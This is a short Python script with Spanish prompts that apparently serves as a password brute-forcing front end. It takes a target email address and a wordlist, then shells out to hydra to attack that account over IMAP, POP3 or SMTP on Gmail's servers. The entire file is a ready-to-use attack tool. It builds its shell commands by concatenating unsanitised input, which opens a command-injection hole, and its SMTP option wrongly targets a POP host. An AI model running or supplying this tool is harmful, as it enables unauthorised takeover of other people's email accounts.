import os

print("""
      
 ▄▀▀▀▀▄   ▄▀▀█▄▄▄▄  ▄▀▀▄ █  ▄▀▀▀▀▄       ▄▀▀▀█▄    ▄▀▀▀▀▄   ▄▀▀▄▀▀▀▄  ▄▀▄▄▄▄   ▄▀▀█▄▄▄▄ 
█        ▐  ▄▀   ▐ █  █ ▄▀ █      █     █  ▄▀  ▀▄ █      █ █   █   █ █ █    ▌ ▐  ▄▀   ▐ 
█    ▀▄▄   █▄▄▄▄▄  ▐  █▀▄  █      █     ▐ █▄▄▄▄   █      █ ▐  █▀▀█▀  ▐ █        █▄▄▄▄▄  
█     █ █  █    ▌    █   █ ▀▄    ▄▀      █    ▐   ▀▄    ▄▀  ▄▀    █    █        █    ▌  
▐▀▄▄▄▄▀ ▐ ▄▀▄▄▄▄   ▄▀   █    ▀▀▀▀        █          ▀▀▀▀   █     █    ▄▀▄▄▄▄▀  ▄▀▄▄▄▄   
▐         █    ▐   █    ▐               █                  ▐     ▐   █     ▐   █    ▐   
          ▐        ▐                    ▐                            ▐         ▐        
""")

menu = int(input("\033[4;31mSelecione un protocolo:\033[4;0m \n  \n 1- imap \n 2- pop3 \n 3- smtp \n \n -> "))

if menu == 1:
    correo = input("Escriba el correo al cual atacar: ")
    diccionario = input("Indique la ruta del diccionario: ")
    print("TODO LISTO VAMOS A DARLE")
    os.system("clear")
    os.system("hydra -l " + correo + " -P " + diccionario + " -s 993 -S imap.gmail.com imap -V")

elif menu == 2:
    correo = input("Escriba el correo al cual atacar: ")
    diccionario = input("Indique la ruta del diccionario: ")
    print("TODO LISTO VAMOS A DARLE")
    os.system("clear")
    os.system("hydra -l " + correo + " -P " + diccionario + " -s 995 -S pop.gmail.com pop3 -V")

elif menu == 3:
    correo = input("Escriba el correo al cual atacar: ")
    diccionario = input("Indique la ruta del diccionario: ")
    print("TODO LISTO VAMOS A DARLE")
    os.system("clear")
    os.system("hydra -l " + correo + " -P " + diccionario + " -s 465 -S pop.gmail.com smtp -V")
